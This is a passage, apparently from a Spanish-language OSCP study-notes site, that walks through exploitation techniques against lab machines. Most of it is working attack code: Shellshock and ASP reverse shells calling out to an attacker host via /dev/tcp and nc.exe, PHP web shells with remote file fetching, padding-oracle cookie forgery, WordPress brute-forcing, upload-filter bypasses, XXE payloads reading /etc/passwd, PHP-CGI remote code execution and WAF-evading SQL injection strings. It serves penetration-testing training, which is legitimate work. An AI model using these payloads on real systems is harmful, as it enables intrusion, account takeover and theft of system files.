:; }; /bin/bash -i &gt;&amp; /dev/tcp/ipLocal/puertoLocal 0&gt;&amp;1\" \"https://192.168.1.X:10000/cgi-bin/recurso.cgi\" \n</code></pre> <p>Si todo sale bien y es vulnerable a la explotaci\u00f3n de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesi\u00f3n de escucha.</p> <p>Advertencia: En caso de que /bin/bash no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerir\u00e1 de una ligera enumeraci\u00f3n manual o un simple modo alternativo de conexi\u00f3n</p> <p>Otra opci\u00f3n es desde Burpsuite tambi\u00e9n, manipulamos el User-Agent para que figure el siguiente contenido:</p> <pre><code>User-Agent: () { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/ip/puerto 0&gt;&amp;1\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#padding-oracle-attack","title":"Padding Oracle Attack","text":"<p>Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la m\u00e1quina Padding Oracle de VulnHub y otra de ellas es la m\u00e1quina Lazy de HackTheBox. Ambas m\u00e1quinas se resuelven de la misma forma en cuanto a explotaci\u00f3n de vulnerabilidad respecta, pudiendo tomar 2 v\u00edas de explotaci\u00f3n.</p> <p>La primera v\u00eda de explotaci\u00f3n consiste en a trav\u00e9s del panel de registro, crear un nuevo usuario donde intuyendo que existe un usuario admin definamos un nuevo usuario admin=. De esta forma, creando el usuario lo que conseguiremos es crear una instancia de dicho usuario con las mismas propiedades, viendo todo su contenido a posteriori como si se tratara del usuario admin. </p> <p>La segunda v\u00eda de explotaci\u00f3n consiste en crear en primer lugar un nuevo usuario. Una vez creado, llevamos a cabo una autenticaci\u00f3n como dicho usuario, pillando la Cookie de sesi\u00f3n desde la pesta\u00f1a Network de la propia inspecci\u00f3n de elemento o desde Burpsuite.</p> <p>A continuaci\u00f3n, utilizamos la herramienta padbuster para llevar a cabo el ataque de or\u00e1culo de relleno. Seguimos la siguiente sintaxis:</p> <pre><code>$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0\n</code></pre> <p>Donde D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km es la Cookie de sesi\u00f3n y 8 el n\u00famero de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle for i in $(seq 1 100) a fin de determinar el n\u00famero de bloques, pues en caso de no ser correcto no se podr\u00e1 aplicar la inyecci\u00f3n.</p> <p>La herramienta tiene cierta similitud al sqlmap para inyecciones SQL, s\u00f3lo que aqu\u00ed las inyecciones las aplica sobre ciertas condiciones de error que son mostradas una vez el n\u00famero de bloques proporcionado es correcto.</p> <p>Lo que obtendremos una vez todo el proceso se realice correctamente es un Output como el siguiente desde la herramienta:</p> <pre><code>[+] Decrypted value (ASCII): user=s4vitar\n[+] Decrypted value (HEX): 757365723d733476697461720808080808080808\n[+] Decrypted value (Base64): dXNlcj1zNHZpdGFyCg==\n</code></pre> <p>Con esto entre manos, lo que podemos hacer es generar desde Padbuster la Cookie de sesi\u00f3n v\u00e1lida para el usuario admin en base a la autenticaci\u00f3n v\u00e1lida del usuario cuya Cookie hemos capturado.</p> <p>Para ello, desde Padbuster aplicamos la siguiente sintaxis:</p> <pre><code>$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0 --plaintext user=admin\n</code></pre> <p>Donde veremos que la herrmamienta directamente nos proporcionar\u00e1 la Cookie de sesi\u00f3n para el usuario administrador.</p> <p>Lo \u00fanico que tenemos que hacer ahora, es desde Burpsuite, interceptar una autenticaci\u00f3n con nuestro usuario para posteriormente modificar la Cookie a la proporcionada por PadBuster. Lo que conseguiremos con esto es acceder como el usuario admin al servicio web, burlando el panel de autenticaci\u00f3n sin ser necesario conocer la contrase\u00f1a de dicho usuario.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wordpress","title":"WordPress","text":"<p>Sobre este gestor de contenidos, la idea es verificar en primer lugar si a trav\u00e9s del recurso README.html podemos visualizar la versi\u00f3n del CMS. De esta forma, posteriormente desde Searchsploit podemos buscar vulnerabilidades para dicha versi\u00f3n.</p> <p>En caso de no poder visualizar la versi\u00f3n, nos aprovechamos de la herramienta wpscan para a trav\u00e9s de la siguiente sintaxis obtener el versionado del gestor:</p> <pre><code>$~ wpscan -u \"http://192.168.1.x\"\n</code></pre> <p>En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo /directorio-wordpress/, deberemos especificarlo a trav\u00e9s del par\u00e1metro --wp-content-dir para la correcta enumeraci\u00f3n desde wpscan:</p> <pre><code>$~ wpscan -u \"http://192.168.1.x\" --wp-content-dir \"directorio-wordpress\"\n</code></pre> <p>En ocasiones, podremos enumerar los usuarios existentes sobre el gestor, empleando para ello la siguiente sintaxis:</p> <pre><code>$~ wpscan -u \"http://192.168.1.x\" --enumerate u\n</code></pre> <p>En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeraci\u00f3n de usuarios, podemos hacer uso de la utilidad stop_user_enumeration_bypass.rb de wpscan (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis ser\u00eda la siguiente:</p> <pre><code>$~ ruby stop_user_enumeration_bypass.rb http://192.168.1.x\n</code></pre> <p>Tras obtener usuarios v\u00e1lidos de autenticaci\u00f3n, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:</p> <pre><code>$~ wpscan -u \"http://192.168.1.x\" --username usuario -w /usr/share/wordlists/rockyou.txt\n</code></pre> <p>Una forma de bypassear posibles bloqueos es jugar con el par\u00e1metro --random-agent, de la siguiente forma:</p> <pre><code>$~ wpscan -u \"http://192.168.1.x\" --username usuario -w /usr/share/wordlists/rockyou.txt --random-agent\n</code></pre> <p>La herramienta wpscan es capaz de detectar los plugins instalados sobre el gestor, los cuales tambi\u00e9n pueden abrir un posible vector de ataque que permita la ejecuci\u00f3n de comandos en remoto y variados. Sin embargo, por prevenci\u00f3n siempre me gusta fuzzear los plugins haciendo uso del siguiente recurso de SecList.</p> <p>En caso de no obtener o poder enumerar usuarios v\u00e1lidos de autenticaci\u00f3n, estos gestores de contenido suelen exponer el usuario propietario de los art\u00edculos o entradas que figuren expuestos sobre la p\u00e1gina principal. De esta forma, podemos llegar a extraer usuarios v\u00e1lidos de autenticaci\u00f3n simplemente visualizando qui\u00e9n es el autor de las entradas publicadas.</p> <p>Teniendo un usuario v\u00e1lido de autenticaci\u00f3n, a la hora de aplicar la fuerza bruta, antes de lanzar diccionarios tradicionales como el rockyou.txt, suelo hacer uso de la herramienta cewl para generar mi propio diccionario personalizado en base a la web con la que estoy tratando. Esto se consigue con la siguiente sintaxis:</p> <pre><code>cewl -w diccionario http://192.168.1.x\n</code></pre> <p>As\u00ed mismo, una vez se logra acceder al gestor de contenidos, la intrusi\u00f3n al sistema es la parte m\u00e1s sencilla. Simplemente en la secci\u00f3n de Apariencia, en la pesta\u00f1a Editor nos vamos al script 404.php configurado para llevar a cabo una modificaci\u00f3n, subiendo nuestro propio c\u00f3digo PHP malicioso que permita entablarnos una conexi\u00f3n reversa contra el sistema.</p> <p>Para apuntar a dicho script tenemos 3 v\u00edas:</p> <ul> <li>http://192.168.1.x/?p=404.php</li> <li>http://192.168.1.x/recursoinexistente (Para causar un error que haga que se cargue el script 404.php)</li> <li>http://192.168.1.x/404.php</li> </ul>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#php-reverse-shell-manual-multifuncional","title":"PHP Reverse Shell Manual Multifuncional","text":"<p>La m\u00e1s t\u00edpica de las ejecuciones v\u00eda PHP que nos podemos configurar es la siguiente:</p> <pre><code>&lt;?php\n    system('whoami');\n?&gt;\n</code></pre> <p>Pero esto dice mucho de nosotros, vamos a mejorar un poco las cosas. En vez de usar system, podemos usar shell_exec, m\u00e1s espec\u00edfico para la ejecuci\u00f3n de comandos v\u00eda shell con retorno del output en formato string.</p> <p>Esto se resume en la siguiente estructura:</p> <pre><code>&lt;?php\n    echo shell_exec('whoami');\n?&gt;\n</code></pre> <p>En caso de querer ejecutar comandos personalizados desde la URL, podemos definir una estructura como la siguiente:</p> <pre><code>&lt;?php\n    echo shell_exec($_REQUEST['cmd']);\n?&gt;\n</code></pre> <p>De manera que podr\u00edamos elaborar desde la URL la siguiente petici\u00f3n:</p> <p><code>http://192.168.1.X/fichero.php?cmd=whoami</code></p> <p>A la hora de ejecutar ciertos comandos como 'ps -faux', o un simple 'cat /etc/passwd', se puede ver como el Output mostrado v\u00eda web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar a\u00f1adiendo unas etiquetas de preformateado en nuestro script:</p> <pre><code>&lt;?php\n    echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\";\n?&gt;\n</code></pre> <p>En caso de querer hacerlo multifuncional, podemos gestionar la variable proporcionada desde el usuario que hace la petici\u00f3n, donde para el caso presentado a continuaci\u00f3n, adem\u00e1s de ejecutar comandos a trav\u00e9s de la variable 'fexec', creamos una nueva variable 'fupload' para la transferencia de archivos desde nuestra m\u00e1quina local a la m\u00e1quina remota en el directorio de trabajo:</p> <pre><code>&lt;?php\n    if(isset($_REQUEST['fexec'])){\n        echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['fexec']) . \"&lt;/pre&gt;\";\n    };\n\n    if(isset($_REQUEST['fupload'])){\n        file_put_contents($_REQUEST['fupload'], file_get_contents(\"http://127.0.0.1:8000/\" . $_REQUEST['fupload']));\n    };\n?&gt;\n</code></pre> <p>De esta forma, el usuario que hace las consultas podr\u00eda efectuar cualquiera de las siguientes 3 operaciones:</p> <ul> <li>http://192.168.1.X/fichero.php?fexec=whoami</li> <li>http://192.168.1.X/fichero.php?fupload=script.php </li> <li>http://192.168.1.X/fichero.php?upload=script.php&amp;fexec=php+script.php</li> </ul> <p>Para depositar archivos sobre el sistema aprovechando la variable 'fupload', necesitaremos compartir un servidor con Python perviamente sobre el directorio cuyos recursos queramos depositar sobre el equipo remoto.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#asp-aspx-reverse-shell","title":"ASP ASPX Reverse Shell","text":"<p>Habiendo citado ya una forma de entablar una conexi\u00f3n TCP reversa a trav\u00e9s de un fichero .asp/.aspx generado desde Metasploit, otra v\u00eda en caso de que la primera no funcione, es crear un archivo con dicho contenido:</p> <pre><code>&lt;%\nDim oS\nOn Error Resume Next\nSet oS = Server.CreateObject(\"WSCRIPT.SHELL\")\nCall oS.Run(\"C:\\Inetpub\\nc.exe -e cmd 10.11.0.173 1122\",0,True)\n%&gt;\n</code></pre> <p>Habiendo previamente subido el binario nc.exe, con esto conseguiremos que de ser interpretado v\u00eda web el script, se nos entable una reverse shell por el puerto 1122 v\u00eda Netcat gracias a la ejecuci\u00f3n del binario previamente alojado.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#x-jenkins","title":"x-jenkins","text":"<p>En caso de que el servicio web corra un Jenkins, de manera inmediata se comprobar\u00e1 si existe el recurso /script/ sobre el servicio. En caso de existir, el servicio es vulnerable a ejecuci\u00f3n remota de comandos gracias al script de consultas interactivas que podemos crear desde ah\u00ed.</p> <p>Para ello, deberemos definir las siguientes l\u00edneas de consulta:</p> <pre><code>cmd = \"whoami\"\ncmd.execute().text\n</code></pre> <p>Tras enviar la consulta, veremos el Output de la ejecuci\u00f3n a nivel de sistema del comando proporcionado.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#bypass-file-upload-filtering","title":"Bypass File Upload Filtering","text":"<p>Una de las t\u00e9cnicas t\u00edpicas adem\u00e1s del Null Byte Injection y las de Content-Type, es la de doble extensi\u00f3n. Esto es simplemente renombrar nuestro script php a shell.php.jpg. </p> <p>Listo a continuaci\u00f3n otros formatos aceptados en funci\u00f3n del lenguaje que se utilice:</p> <p>php phtml, .php, .php3, .php4, .php5, and .inc asp asp, .aspx perl .pl, .pm, .cgi, .lib jsp .jsp, .jspx, .jsw, .jsv, and .jspf Coldfusion .cfm, .cfml, .cfc, .dbm</p> <p>En caso de analizar el Content en la subida de archivo, podemos bypassearla de la siguiente forma:</p> <pre><code>GIF89a;\n&lt;?\nsystem($_GET['cmd']);\n?&gt;\n</code></pre> <p>Otra v\u00eda alternativa es a trav\u00e9s de im\u00e1genes, haciendo uso de exiftool para insertar metadatos. Para ello, sobre una imagen v\u00e1lida, aplicamos el siguiente comando:</p> <pre><code>exiftool -Comment='&lt;?php echo \"&lt;pre&gt;\"; system($_GET['cmd']); ?&gt;' imagen.jpg\n</code></pre> <p>Posteriormente, es necesario renombar el archivo imagen.jpg a imagen.php.jpg. Una vez hecho, tras subir la imagen, podremos apuntar a ella jugando con la variable cmd posteriormente para ejecutar comandos en remoto sobre el sistema desde la URL.</p> <p>Otra t\u00e9cnica bastante chula, consiste en subir un archivo .htaccess. En caso de existir en el directorio de subida, la idea es poder sobreescribir su contenido. En caso de no existir, es simplemente rezar y esperar que no exista otro en un directorio padre.</p> <p>Nuestro archivo .htaccess, tendr\u00eda el siguiente contenido:</p> <pre><code>Add-Type Application/x-httpd-php .miextension\n</code></pre> <p>De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensi\u00f3n .miextension, ser\u00e1 interpretado como un archivo PHP.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#xml-external-entity-injection","title":"XML External Entity Injection","text":"<p>Para practicar podemos jugar con las m\u00e1quinas Aragog y DevOops de HackTheBox. Antes que nada quiero citar que es necesario conocer la estructura XML que hay por detr\u00e1s a la hora de interpretar el content, me explico. Supongamos que tras subir un archivo XML, la web nos muestra el siguiente Output:</p> <pre><code>User: s4vitar\nPassword: myPassword\n</code></pre> <p>Esto ha sido as\u00ed dado que previamente de alguna forma se nos ha avisado de que las sub-etiquetas a definir en nuestro archivo XML son User y Password, as\u00ed como una etiqueta principal creds que englobe a estas. Esto nos permite llevar a cabo un ataque como el que describir\u00e9 a continuaci\u00f3n. </p> <p>En un principio, estar\u00edamos enviando el siguiente archivo XML:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n    &lt;creds&gt;\n       &lt;User&gt;s4vitar&lt;/user&gt;\n       &lt;Pass&gt;myPassword&lt;/pass&gt;\n    &lt;/creds&gt;\n</code></pre> <p>Conociendo por tanto la estructura, podr\u00edamos decidir enviar un contenido como el siguiente:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;\n   &lt;!ENTITY xxe SYSTEM \"expect://id\" &gt;]&gt;\n    &lt;creds&gt;\n       &lt;User&gt;&amp;xxe;&lt;/user&gt;\n       &lt;Pass&gt;myPassword&lt;/pass&gt;\n    &lt;/creds&gt;\n</code></pre> <p>A la hora de listar el Output desde la web, nos encontrar\u00edamos con el siguiente resultado:</p> <pre><code>User: www-data\nPassword: myPassword\n</code></pre> <p>Esto ha sido as\u00ed dado que estamos jugando con el wrapper expect. Hay casos en los que puede que no se logre ejecutar comandos en el sistema, en tal caso podr\u00edamos probar a leer archivos de la siguiente forma:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;\n   &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n    &lt;creds&gt;\n       &lt;User&gt;&amp;xxe;&lt;/user&gt;\n       &lt;Pass&gt;myPassword&lt;/pass&gt;\n    &lt;/creds&gt;\n</code></pre> <p>Donde tal y como se podr\u00e1 predecir, en el campo User se listar\u00e1 el contenido del fichero /etc/passwd. Una idea aqu\u00ed es visualizar si para algunas de los usuarios existentes en base a la visualizaci\u00f3n del recurso anteriormente visto, bajo el directorio .ssh podemos encontrarnos con una clave privada de acceso por SSH para usarla como fichero de identificaci\u00f3n, de esta forma... lograr\u00edamos acceder al sistema sin proporcionar contrase\u00f1a alguna.</p> <p>Otro ejemplo pr\u00e1ctico as\u00ed como modo de hacer el mismo procedimiento es el siguiente. Supongamos un servicio Apache, esta vez no tenemos la posibilidad de subir archivos, sin embargo contamos por detr\u00e1s con la siguiente estructura:</p> <pre><code>&lt;?php \n    libxml_disable_entity_loader (false); \n    $xmlfile = file_get_contents('php://input'); \n    $dom = new DOMDocument(); \n    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); \n    $creds = simplexml_import_dom($dom); \n    $user = $creds-&gt;user; \n    $pass = $creds-&gt;pass; \n    echo \"You have logged in as user $user\";\n?&gt; \n</code></pre> <p>Como es de obviar, se nos pide una estructura XML como la siguiente:</p> <pre><code>&lt;creds&gt;\n    &lt;user&gt;Ed&lt;/user&gt;\n    &lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;\n</code></pre> <p>En este caso var\u00eda un poco la petici\u00f3n, pero podemos hacerla desde terminal:</p> <pre><code>$~ curl -d @xml.txt http://localhost/xml_injectable.php \n</code></pre> <p>El concepto al fin y al cabo es el mismo, el servidor responde lo siguiente:</p> <pre><code>You have logged in as user Ed\n</code></pre> <p>Y a ra\u00edz de esto, podemos elaborar una estructura XML maliciosa como la siguiente:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;creds&gt;\n    &lt;user&gt;&amp;xxe;&lt;/user&gt;\n    &lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;\n</code></pre> <p>\u00bfQu\u00e9 conseguimos con esto?, obtener lo siguiente:</p> <pre><code>$~ curl -d @xml.txt http://localhost/xml_injectable.php \n\nYou have logged in as user root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#php-cgi-exploitation","title":"PHP CGI Exploitation","text":"<p>A continuaci\u00f3n, se detalla una vulnerabilidad presente en algunos php-cgi desactualizados, los cuales nos permiten entre otras cosas lograr la ejecuci\u00f3n remota de comandos.</p> <p>La pregunta a hacerse es, \u00bfc\u00f3mo comprobamos si en caso de que exista, posee una versi\u00f3n vulnerable?. Dado que uno de los par\u00e1metros con los que cuenta el binario es el -s, el cual nos permite ver el Source de aquello que le pasemos, una de las trazas que suelo hacer para corroborar si es o no es vulnerable es hacer una consulta sobre el recurso /?-s.</p> <p>Si lo que vemos es el c\u00f3digo fuente en vez del contenido de la p\u00e1gina en formato legible, esto quiere decir, en pocas palabras, que es probable que podamos hacer RCE (Remote Code Execution). Recapitulando, hemos sido capaces de ver el Source de la propia web a trav\u00e9s del par\u00e1metro pasado, pero no sirve de mucho si lo que pretendemos hacer es dar un enfoque intrusivo a la m\u00e1quina que sustenta este servidor web.</p> <p>Sin embargo, existe otro par\u00e1metro interesante del php-cgi del cual nos podemos aprovechar, el par\u00e1metro -d. Este par\u00e1metro nos permite definir las entradas INI de la configuraci\u00f3n de archivos. Algo a tener en cuenta, en caso de pretender lograr ejecuci\u00f3n remota de c\u00f3digo, es tratar de enviar c\u00f3digo PHP al servidor y que sea capaz de interpretarlo. </p> <p>Para ello, lo que hacemos es utilizar el wrapper php://input, con el fin de incrustar el c\u00f3digo definido en el cuerpo de la solicitud.</p> <p>Necesitamos 2 cosas para ello, por un lado, necesitamos que se lea el c\u00f3digo php de nuestra solicitud. Lo que buscamos es una opci\u00f3n PHP que diga al propio PHP que lea de un archivo y lo apunte a php://input. Afortunadamente, PHP cuenta con la opci\u00f3n auto_prepend_file desde la versi\u00f3n 4.2.3. Lo bueno de esta opci\u00f3n, es que el contenido del archivo se incluye antes que cualquier otro archivo, o en otras palabras, se incluye antes de ejecutar cualquier otro c\u00f3digo, por lo que garantizamos que ning\u00fan otro c\u00f3digo afecte a nuestra explotaci\u00f3n.</p> <p>Por otro lado, si queremos usar php://input, debemos permitir que la url lo incluya, pero esto no supone ning\u00fan problema, dado que podemos redefinir las entradas INI. Esto puede activarse f\u00e1cilmente usando -d allow_url_include=1.</p> <p>Suponiendo que quisi\u00e9ramos ejecutar en remoto el comando whoami, lo que hacemos es montarnos un simple script PHP de antemano el cual enviamos posteriormente v\u00eda POST a la web con todo lo que hemos comentado. De la siguiente forma:</p> <pre><code>$~ echo \"&lt;?php system('whoami');die(); ?&gt;\" | POST \"http://192.168.1.X/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input\"\n\nwww-data\n</code></pre> <p>Para entablar una reverse shell, ya simplemente depender\u00e1 de la metodolog\u00eda que una quiera emplear.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#waf-bypassing","title":"Waf Bypassing","text":""},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#waf-sql-injection-bypass-waf-techniques","title":"WAF SQL Injection Bypass WAF Techniques","text":"<p>1. Null Bytes</p> <p>Para elaborar una inyecci\u00f3n Null Byte:</p> <pre><code>http://example.com/news.php?id=1+%00\u2019union+select+1,2,3\u2032\u2013\n</code></pre> <p>2. Consultas a trav\u00e9s de SQL Comments</p> <pre><code>http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3\u2013\n</code></pre> <p>3. URL Encoding</p> <pre><code>http://example.com/news.php?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4\u2014\n</code></pre> <p>4. Encode to Hex Forbidden</p> <pre><code>http://example.com/news.php?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 \u2013+-\n\nhttp://example.com/news.php?id=-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5 \u2013+-\n</code></pre> <p>5. Case Changing</p> <pre><code>http://example.com/news.php?id=-1+UnIoN//SeLecT//1,2,3\u2013+-\n</code></pre> <p>6. Replaced Keywords</p> <pre><code>http://example.com/news.php?id=-1+UNunionION+SEselectLECT+1,2,3\u2013+\n</code></pre> <p>7. WAF Bypassing - using characters</p> <pre><code>http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4\u2013+-\n</code></pre> <p>8. CRLF WAF Bypass Technique</p> <pre><code>http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 \u2014\n</code></pre> <p>9. HTTP Parameter Pollution (PHP)</p> <pre><code>http://example.com/news.php?id=1;select+1&amp;id=2,3+from+users+where+id=1\u2013\n\n\nhttp://example.com/news.php?id=-1/* &amp;id= */union/* &amp;id= */select/* &amp;id= */1,2 \u2014\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#pentesting-linux","title":"Pentesting Linux","text":""},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#tratamiento-de-la-tty","title":"Tratamiento de la TTY","text":"<p>Una vez accedemos a un equipo Linux con una reverse shell de Netcat, veremos que andamos a ciegas, lo que hace que incluso no podamos utilizar servicios que corran en interactivo (Python, mysql, etc.). Para arreglar este problema, simplemente seguimos los pasos que se describen a continuaci\u00f3n.</p> <ul> <li>Cargamos una pseudoconsola sobre el sistema</li> </ul> <p>Tenemos 2 formas de hacer esto, la primera es la siguiente:</p> <pre><code>script /dev/null -c bash\n</code></pre> <p>Otra de ellas es a trav\u00e9s de python, para ello se recomienda aplicar un <code>whereis python</code> a nivel de sistema para comprobar las versiones que se encuentran presentes en el sistema, as\u00ed tendremos que aplicar el siguiente comando seguido de su versi\u00f3n:</p> <pre><code>python -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <ul> <li>Configuramos las variables de entorno correctamente</li> </ul> <p>A continuaci\u00f3n presionamos la tecla Ctrl+Z, esto lo que har\u00e1 ser\u00e1 dejar en segundo plano nuestra sesi\u00f3n (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:</p> <pre><code>stty raw -echo\nfg\nreset\nxterm\n</code></pre> <p>Tras introducir el primero, es normal que al escribir fg no veamos lo que se est\u00e1 escribiendo, sin embargo se est\u00e1n introduciendo los caracteres. Este comando lo que har\u00e1 ser\u00e1 retornanos a la sesi\u00f3n que ten\u00edamos v\u00eda Netcat. Con el comando reset reconfiguraremos nuestra sesi\u00f3n, pregunt\u00e1ndonos en la mayor\u00eda de los casos a continuaci\u00f3n con qu\u00e9 tipo de terminal queremos tratar.</p> <p>Puede ser que no nos pregunte por el tipo de terminal, en caso de que s\u00ed lo haga, introducimos <code>xterm</code>, en caso de que no e incluso aunque lo pida, posteriormente aplicamos los siguientes comandos:</p> <pre><code>export TERM=xterm\nexport SHELL=bash\n</code></pre> <p>Una vez hecho, lo \u00fanico que queda (paso opcional), es configurar correctamente el redimensionamiento de la terminal, pues en caso de abrir alg\u00fan editor como nano, veremos que las proporciones no cuadran. Para ello, lo m\u00e1s recomendable es poner a tama\u00f1o completo la terminal.</p> <p>Abrimos otra terminal en nuestro sistema con el mismo redimensionamiento, y aplicamos el siguiente comando:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home/s4vitar/Desktop]\n\u2514\u2500\u2500\u257c #stty -a\nspeed 38400 baud; rows 44; columns 190; line = 0;\nintr = ^C; quit = ^\\; erase = ^?; kill = ^U; eof = ^D; eol = &lt;undef&gt;; eol2 = &lt;undef&gt;; swtch = &lt;undef&gt;; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;\nmin = 1; time = 0;\n-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts\n-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8\nopost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0\nisig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc\n</code></pre> <p>Tal y como podemos ver, figuran los n\u00fameros de filas y columnas, 44 y 190 respectivamente para este caso. Copiamos dicha configuraci\u00f3n en la m\u00e1quina que hemos comprometido donde se ha llevado a cabo toda la previa configuraci\u00f3n, aplicando para ello el siguiente comandos:</p> <pre><code>stty rows 44 columns 190\n</code></pre> <p>El resultado final ser\u00e1 una Shell completamente interactiva, donde nos sentiremos como si hubi\u00e9ramos ganado acceso por SSH, con capacidad de tabulaci\u00f3n, uso de Shortcuts (Ctrl+C, Ctrl+L, etc.), sesiones interactivas, etc.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#process-monitoring","title":"Process Monitoring","text":"<p>A la hora de escalar privilegios, es una buena idea montarse un script procmon.sh para la monitorizaci\u00f3n de procesos y comandos aplicados a nivel de sistema en tiempo real.</p> <p>Para ello, tan s\u00f3lo tendremos que crear un script sobre el sistema como el siguiente:</p> <pre><code>#!/bin/bash\n\nold_process=$(ps -eo command)\n\nwhile true; do\n    new_process=$(ps -eo command)\n    diff &lt;(echo \"$old_process\") &lt;(echo \"$new_process\") | grep \"[\\&gt;\\&lt;]\" | grep -v \"procmon.sh\" | grep -v \"command\"\n    old_process=$new_process\ndone\n</code></pre> <p>Tras su ejecuci\u00f3n, tendremos una visual de toods los comandos que se est\u00e1n aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#escaping-restricted-shell","title":"Escaping Restricted Shell","text":"<p>Con el objetivo de preparar un escenario realista, presentar\u00e9 2 casos, partiendo de una escapada convencional a otra un poco m\u00e1s rebuscada. Tambi\u00e9n hay que decir que todo depender\u00e1 del nivel de restricci\u00f3n que el administrador haya implementado sobre el usuario.</p> <p>Para el primer caso, seguimos los siguientes pasos para preparar nuestro escenario de usuario:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/home]\n\u2514\u2500\u2500\u257c #mkdir testuser\n\u250c\u2500[root@parrot]\u2500[/home]\n\u2514\u2500\u2500\u257c #useradd testuser -d /home/testuser -s /bin/rbash\n\u250c\u2500[root@parrot]\u2500[/home]\n\u2514\u2500\u2500\u257c #passwd testuser\nIntroduzca la nueva contrase\u00f1a de UNIX: \nVuelva a escribir la nueva contrase\u00f1a de UNIX: \npasswd: contrase\u00f1a actualizada correctamente\n\u250c\u2500[root@parrot]\u2500[/home]\n\u2514\u2500\u2500\u257c #chown testuser:testuser /home/testuser\n</code></pre> <p>En este caso, la contrase\u00f1a asignada ha sido test123. Como vemos, se ha asignado una shell restrictiva al usuario testuser, esto lo podemos comprobar a trav\u00e9s de la variable export:</p> 